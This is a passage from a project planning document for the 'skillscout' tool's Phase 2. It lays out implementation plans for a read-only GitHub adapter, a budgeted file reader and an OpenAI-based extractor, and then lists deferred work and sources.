1. **Dependency Gate and Frozen Contracts:** repeat the Phase 1 non-building lock discovery + human approval for `httpx`/`openai`; then land `domain/subjects.py` (`RepositorySubject`, `load_subject`), `domain/filtering.py` (`FilterPolicy`, rule results), `domain/reading.py` (`ReaderPolicy`, tiering, classification), `domain/extraction.py` (`ExtractorResponse`, `WorkflowSpec`, fingerprint, boundary validation), the `COMPLETED` run status, `INVALID_SUBJECT` error code, and the `("2","phase2-v1")` producer registration — all with pure unit tests, zero network code.
2. **Runner Generalization + GitHub Adapter + Scout/Filter:** `PipelineProfile` slice, `StageOutcome`/telemetry/context extension (FixtureProcessor signature bump), `adapters/github.py` (`GitHubReadClient`, `REMOTE_READ`, allowlisted endpoints, rate-limit mapping), Scout and Filter processors, `build_phase_two_runtime`, MockTransport fixtures.
3. **Budgeted Reader:** tiered reading loop, all budget knobs, early stop, full rejection matrix, read-record payload, in-memory context bundle.
4. **Extractor + CLI + Acceptance:** `adapters/openai_extract.py` (`OpenAIExtractionClient`, `REMOTE_READ`), Extractor processor with telemetry and outcome mapping, CLI `extract-repo`, `extraction-summary.json` writer, injection corpus + boundary/security suites, end-to-end resume/retry/idempotency demonstrations, verification evidence.

Each plan should contain 2–3 tasks and a complete vertical refinement, per the Phase 1 convention.

## Deferred to Later Phases

- Qualifier, Generator, Validators, Reviewer stages (Phase 3) — Phase 2 stops at Extractor.
- Any `REMOTE_WRITE`, GitHub App tokens, branches, Draft PRs (Phase 4).
- GitHub Search, candidate fan-out, 100/20 run budgets, ETag caching, `skillscout-state` branch persistence, Actions schedules (Phase 5).
- OS/syscall-level network denial (WR-04, already deferred to Phase 6), live multi-repo acceptance, SHA-256-repository support.
- Zero Data Retention org enrollment — `store=false` is the Phase 2 control; ZDR is an operations decision.

## Sources

- [GitHub REST: Get a repository](https://docs.github.com/en/rest/repos/repos)
- [GitHub REST: Git trees](https://docs.github.com/en/rest/git/trees?apiVersion=2022-11-28)
- [GitHub REST: Git blobs](https://docs.github.com/en/rest/git/blobs?apiVersion=2022-11-28)
- [GitHub REST: Licenses](https://docs.github.com/en/rest/licenses/licenses)
- [GitHub REST: Rate limits](https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api)
- [GitHub REST: Best practices (redirects, conditional requests, URL handling)](https://docs.github.com/en/rest/using-the-rest-api/best-practices-for-using-the-rest-api)
- [OpenAI: Structured Outputs](https://platform.openai.com/docs/guides/structured-outputs)
- [OpenAI: Data controls and retention](https://platform.openai.com/docs/guides/your-data)
- [OpenAI Python SDK on PyPI](https://pypi.org/project/openai/)
- [HTTPX on PyPI](https://pypi.org/project/httpx/)
- Project: `.planning/REQUIREMENTS.md` (FILT/READ/EXTR/SEC-01), `.planning/research/ARCHITECTURE.md` (entity table, WorkflowSpec shape, fingerprint guidance, state machine), `.planning/research/PITFALLS.md` (P0/P1 risks), `.planning/research/STACK.md`
- Phase 1 code: `src/skillscout/domain/enums.py`, `src/skillscout/domain/models.py`, `src/skillscout/domain/canonical.py`, `src/skillscout/application/ports.py`, `src/skillscout/application/pipeline.py`, `src/skillscout/adapters/fixtures.py`, `src/skillscout/adapters/state.py`, `src/skillscout/cli.py`, `tests/conftest.py`, `tests/test_side_effect_policy.py`, `pyproject.toml`

## RESEARCH COMPLETE

Phase 2 can be planned without further product decisions. The spine already contains the stage names, the `REMOTE_READ` scope, telemetry fields, and schema-"2" hash preimages Phase 2 needs; the real work is one new producer (`phase2-v1`), a four-stage profile slice with global indices, a runtime-only context carrier, two REMOTE_READ adapters behind a phase-two composition root, and deterministic contracts for filtering, budgeted reading, and bounded extraction. Two dependencies (`httpx`, `openai`) must pass the Phase 1 lock-approval gate before any code executes; every network and LLM call is replaceable in tests through `httpx.MockTransport`, keeping the suite deterministic and credential-free.
